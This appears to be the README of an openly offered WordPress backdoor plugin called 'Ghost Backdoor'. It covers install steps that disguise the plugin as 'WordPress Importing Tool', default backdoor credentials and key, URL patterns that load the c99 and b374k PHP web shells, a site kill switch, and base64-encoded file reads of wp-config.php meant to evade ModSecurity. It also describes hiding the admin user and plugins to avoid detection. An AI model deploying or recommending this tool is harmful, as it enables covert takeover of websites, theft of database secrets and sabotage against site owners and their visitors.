# Ghost Backdoor WordPress Plugin

**Contributors**:
* [CLEANCODED](https://cleancoded.com/)

**Tested On**:
* Version 4.9.4

**License**: GPLv3 or later

# Description

This plugin does the following:
* Creates a ghost admin user
* Installs all plugins in the ./plugins/ folder.
* Hides said ghost admin user from the WordPress backend area
* Hides the ghost plugin and all plugins loaded by ghost
* Hides plugin and user counters
* Adds a "kill switch” feature that redirects all pages to "bummersauce.com"
* Adds a method to access the c99 & b374k PHP shells via URL

# Installation

1. Download the latest release of ghost here: 
    * https://github.com/cleancoded/ghost-backdoor-wordpress/
2. Modify ghost plugin as needed. 
    * The backdoor username, password and key are all stored in the __construct() method of the ghost plugin. 
    * Search for `$this->username =`, `$this->password =`, and `$this->key =` to find the values that need to be updated. 
3. Upload plugin files to the `/wp-content/plugins/wp-default/` directory (create this if it does exist), or install the plugin through the plugins area of the WordPress backend if you want to keep defaults.
4. Activate the plugin through the 'Plugins' area of the WordPress backend.  It is called `WordPress Importing Tool`
5. Login as the newly created ghost user.

# Frequently Asked Questions

* **What is the default login of the WordPress ghost admin user?**
    * Username: Hc462N5M4bP4SMk
    * Password: K6BJ8V4JE6NeJ6g

* **What is the default key?**
    * a9J4dquMy3Qw7dvwN4yMvVm68K

* **How do I access the PHP shell?**
    * To access the PHP shell, for example, the default C99 shell on http://localhost.com, navigate to this url:    
        * http://localhost.com/loadshell-c99-a9J4dquMy3Qw7dvwN4yMvVm68K
    * The pattern for this is `loadshell-(SHELLNAME)-(KEY)`.

* **How do I use the killsite/killswitch feature?**
    * To kill the website, http://localhost.com for example, navigate to this url:
        * http://localhost.com/killsite-a9J4dquMy3Qw7dvwN4yMvVm68K
    * The pattern for this is `loadshell-(SHELLNAME)-(KEY)`.

* **How do I view site files using the displayfile feature?**
    * The function accepts base64 encoded filenames.
    * To view wp-config.php when viewing from the main webpage of localhost.com, you would navigate to this url:
        * http://localhost.com/?displayfile-d3AtY29uZmlnLnBocA==
    * The pattern for this is `?displayfile=(BASE64_ENCODE(FILENAME))`

* **Does the ghost user display for the other site admins?**
    * Nope, the ghost user is invisible; visible only to the authenticated ghost user.  All other users will not see the ghost user.

* **Do any users see the plugins installed by ghost?**
    * No, the plugins installed by ghost are hidden to all users except the authenticated ghost user.  Upon deactivation, these plugins will be deleted to allow for less intrusion detection.

* **If I deactivate the plugin, will I still have access to the website?**
    * No, upon deactivation, the plugin will remove the ghost user and delete all plugins that it has installed.  The only remains of the plugin will be the plugin itself, so it’s a good idea to delete the plugin files, excluding the plugin itself, before disabling. 

# Changelog

* **0.4**
    * Major rebuild
    * Dynamic plugin system, allows users to include plugin zip files in the ./plugins/ folder for upload.
        * Installs & activates plugins on backdoor activation.
        * Uninstalls plugins on backdoor deactivation
        * Keeps these plugins activated by attempting to activate on every page load by any visitor on the website.
    * Backdoor user deleted on deactivation
    * Added functionality to view any file on the filesystem from the URL & base64 encoded to avoid modsecurity detection.

* **0.3**
    * Added in dynamic shell inclusion from the ./sh/ folder.  Allows users to use whatever shell they prefer instead of specifically c99.
    * Different hook to view of wp-config.php

* **0.2**
    * Changed to class layout for easier modification/use and less chance of conflict
    * C99 shell inclusion by accessing it directly through plugin folder
    * Added killswitch functionality
    * Added functionality to view wp-config.php

* **0.1**
    * Made backdoor user creation routines
    * Made backdoor user hidden from all users
    * Made it forcefully activate if it is installed WP Downloader and keep it activated

# Roadmap

* Allow for custom code inclusion that takes advantage of the WP_GHOST class & methods.
* Write a better display file method that's easier to use
* Implement an admin menu/area that only the backdoor user can access for easy manipulation of the backdoor.